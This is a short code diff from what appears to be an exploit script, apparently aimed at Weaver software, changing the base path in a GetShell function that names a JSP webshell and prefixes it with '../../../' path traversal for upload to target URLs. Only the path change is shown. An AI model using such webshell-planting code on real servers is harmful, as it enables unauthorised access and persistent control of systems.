@@ -63,7 +63,7 @@ def file_zip(mm, webshell_name2):
 
 
 def GetShell(urllist):
-    mm = 'GyBtVQDJ'
+    mm = '/TIP/info_scan/weaver_exp/GyBtVQDJ'
     webshell_name1 = mm + '.jsp'
     webshell_name2 = '../../../' + webshell_name1
 
